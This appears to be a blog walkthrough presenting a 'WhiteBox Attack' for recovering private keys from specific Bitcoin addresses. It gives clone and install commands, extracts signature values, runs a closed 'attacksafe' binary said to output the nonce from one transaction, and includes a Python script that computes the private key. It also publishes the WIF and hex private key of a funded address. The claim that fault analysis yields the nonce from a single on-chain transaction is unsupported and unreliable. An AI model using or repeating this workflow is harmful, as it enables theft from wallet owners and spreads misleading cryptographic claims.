
# WhiteBox Attack

---


---






<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/023-1-1024x576.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1685"></figure></div>


<p>In this article, we will again touch on the topic of a signature failure in a blockchain transaction and apply a completely new attack:&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“WhiteBox Attack on Bitcoin”</a>&nbsp;.<br>Differential fault analysis&nbsp;<code>(DFA)</code>was briefly described in the literature in 1996 when&nbsp;<em>an Israeli cryptographer and cryptanalyst</em>&nbsp;<code>Eli Biham</code>&nbsp;and&nbsp;<em>an Israeli scientist</em>&nbsp;<code>Adi Shamir</code>&nbsp;showed that they could use error injection to extract the&nbsp;<em>secret key</em>&nbsp;and recover the&nbsp;<em>private key</em>&nbsp;using various signature and verification algorithms.</p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-6-1024x467.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1544"></figure>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-7.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1546"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/crypto.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1541"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-10-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1567"></figure></div>


<p>We implement the&nbsp;<strong><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“WhiteBox Attack on Bitcoin”</a></strong>&nbsp;with the differential bugs described in this research paper.&nbsp;The classic&nbsp;<code>DFA</code>that we described in the previous&nbsp;<a href="https://cryptodeep.ru/rowhammer-attack/" target="_blank" rel="noreferrer noopener">article</a>&nbsp;is called&nbsp;<code>F()</code>.&nbsp;Some of these attacks also require two signature pairs&nbsp;<code>ECDSA</code>.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-9-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1565"></a><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><strong>www.attacksafe.ru/whitebox-attack-on-bitcoin</strong></a></figcaption></figure></div>


<p>The theoretical part of this attack can be found in the article from the list of popular Bitcoin attacks:&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>“WhiteBox Attack on Bitcoin”</strong></a></p>



<p>From our early&nbsp;<a href="https://cryptodeep.ru/publication/" target="_blank" rel="noreferrer noopener">publications,</a>&nbsp;we know that there are a lot of vulnerable and weak transactions in the Bitcoin blockchain, and in the process of our cryptanalysis, we found many Bitcoin Addresses where a large number of signatures&nbsp;<code>ECDSA</code>were made with the disclosure of the secret key&nbsp;<code>"K" (NONCE)</code>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>As a result, knowing the secret key, we can accurately obtain the private key to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Consider three Bitcoin Addresses:</h2>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Each Bitcoin Address made two critical vulnerable transactions:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499">https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499</a></p>



<p><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba">https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1523"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-1-1024x199.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1525"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>



<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-2-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1527"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-3-1024x202.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1529"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-4-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1531"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-5-1024x200.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1533"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Disclosure of the secret key “K” (NONCE) in the Bitcoin blockchain</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing an efficient&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>WhiteBox Attack</strong></a>&nbsp;algorithm using our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener"><strong>16WhiteBoxAttack repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/16WhiteBoxAttack/

ls</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-11-1024x531.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1575"></figure>



<h3>Install all the packages we need</h3>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-11.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-687"><figcaption class="wp-element-caption"><strong><code>requirements.txt</code></strong></figcaption></figure>



<pre class="wp-block-code"><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-111-1024x448.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1175"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-112-1024x452.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1177"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-114-1024x452.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1179"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2></h2>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499">https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-12-1024x142.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1577"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-14-1024x281.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1581"></figure>



<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>To implement the attack and get the secret key, we will use the&nbsp;</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-14.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-705"></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure></div>


<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-15.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1583"></figure>



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-17.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1586"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-18.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1587"></figure>



<p><code>"ATTACKSAFE SOFTWARE"</code>includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-19-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1589"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-20-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1590"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-21-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1592"></figure>



<p>then choose<code>&nbsp;-tool: whitebox_attack</code></p>



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-22-1024x276.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1594"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-24-1024x482.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1597"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d

RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To do this, install the&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;elliptic curve library :</p>



<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-44-1024x335.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-968"></figure>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-25-1024x86.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1599"></figure>



<p><code>(0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
point2gen  =   (0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use the&nbsp;<em>Python</em>&nbsp;script:&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d
R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-26.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1601"></figure>



<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1687"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY">https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-28-1024x461.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1605"><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 607.79</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



